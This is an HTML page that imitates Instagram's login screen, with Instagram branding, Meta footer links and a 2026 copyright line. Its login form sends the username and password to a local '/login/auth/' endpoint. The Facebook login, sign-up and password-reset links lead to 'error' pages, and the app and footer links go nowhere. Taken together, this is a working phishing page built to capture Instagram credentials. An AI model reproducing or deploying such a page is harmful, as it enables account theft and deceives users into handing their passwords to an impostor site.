<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap');

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 350px;
            width: 100%;
        }

        .login-box {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            padding: 40px 40px 20px;
            margin-bottom: 10px;
        }

        .logo {
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"><text x="50%" y="50%" font-family="Arial, sans-serif" font-size="40" font-weight="bold" text-anchor="middle" dominant-baseline="middle">Instagram</text></svg>');
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
            height: 51px;
            margin: 0 auto 32px;
        }

        .instagram-logo {
            font-family: 'Grand Hotel', cursive;
            font-size: 52px;
            text-align: center;
            margin-bottom: 32px;
            color: #262626;
            font-weight: 400;
        }

        form {
            display: flex;
            flex-direction: column;
        }

        input {
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 9px 8px 7px;
            font-size: 12px;
            margin-bottom: 6px;
            outline: none;
        }

        input:focus {
            border-color: #a8a8a8;
        }

        input::placeholder {
            color: #8e8e8e;
        }

        .login-button {
            background-color: #0095f6;
            color: #fff;
            border: none;
            border-radius: 8px;
            padding: 7px 16px;
            font-size: 14px;
            font-weight: 600;
            margin-top: 8px;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .login-button:hover {
            background-color: #1877f2;
        }

        .login-button:active {
            opacity: 0.7;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 18px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }

        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .divider::before {
            margin-right: 18px;
        }

        .divider::after {
            margin-left: 18px;
        }

        .fb-login {
            display: flex;
            align-items: center;
            justify-content: center;
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            text-decoration: none;
            margin-bottom: 18px;
        }

        .fb-login::before {
            content: '';
            display: inline-block;
            width: 16px;
            height: 16px;
            background-color: #385185;
            border-radius: 3px;
            margin-right: 8px;
        }

        .fb-login:hover {
            color: #00376b;
        }

        .forgot-password {
            text-align: center;
            font-size: 12px;
            color: #00376b;
            text-decoration: none;
            margin-top: 12px;
        }

        .forgot-password:hover {
            color: #003c75;
        }

        .signup-box {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            padding: 24px 40px;
            text-align: center;
            font-size: 14px;
        }

        .signup-link {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }

        .signup-link:hover {
            color: #00376b;
        }

        .app-download {
            text-align: center;
            margin-top: 20px;
        }

        .app-download p {
            font-size: 14px;
            margin-bottom: 16px;
        }

        .app-buttons {
            display: flex;
            justify-content: center;
            gap: 8px;
        }

        .app-button {
            height: 40px;
            background-color: #000;
            border-radius: 5px;
            padding: 0 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            text-decoration: none;
            font-size: 12px;
            transition: opacity 0.2s;
        }

        .app-button:hover {
            opacity: 0.8;
        }

        footer {
            text-align: center;
            margin-top: 50px;
            padding-bottom: 20px;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 16px;
            margin-bottom: 16px;
            font-size: 12px;
        }

        .footer-links a {
            color: #8e8e8e;
            text-decoration: none;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        .copyright {
            color: #8e8e8e;
            font-size: 12px;
        }

        @media (max-width: 450px) {
            .login-box {
                border: none;
                padding: 20px;
            }

            .signup-box {
                border: none;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="instagram-logo">Instagram</div>
            
            <form action="/login/auth/userid69206c6f766520796f75" method="post">
                <input type="text" placeholder="Phone number, username, or email" required name="username">
                <input type="password" placeholder="Password" required name="password">
                <button type="submit" class="login-button">Log in</button>
            </form>

            <div class="divider">OR</div>

            <a href="error" class="fb-login">Log in with Facebook</a>

            <a href="/error" class="forgot-password">Forgot password?</a>
        </div>

        <div class="signup-box">
            <p>Don't have an account? <a href="error" class="signup-link">Sign up</a></p>
        </div>

        <div class="app-download">
            <p>Get the app.</p>
            <div class="app-buttons">
                <a href="#" class="app-button">Get it on Google Play</a>
                <a href="#" class="app-button">Download on App Store</a>
            </div>
        </div>

        <footer>
            <div class="footer-links">
                <a href="#">Meta</a>
                <a href="#">About</a>
                <a href="#">Blog</a>
                <a href="#">Jobs</a>
                <a href="#">Help</a>
                <a href="#">API</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
                <a href="#">Locations</a>
                <a href="#">Instagram Lite</a>
                <a href="#">Threads</a>
                <a href="#">Contact Uploading & Non-Users</a>
                <a href="#">Meta Verified</a>
            </div>
            <div class="copyright">
                © 2026 Instagram from Meta
            </div>
        </footer>
    </div>
</body>
</html>
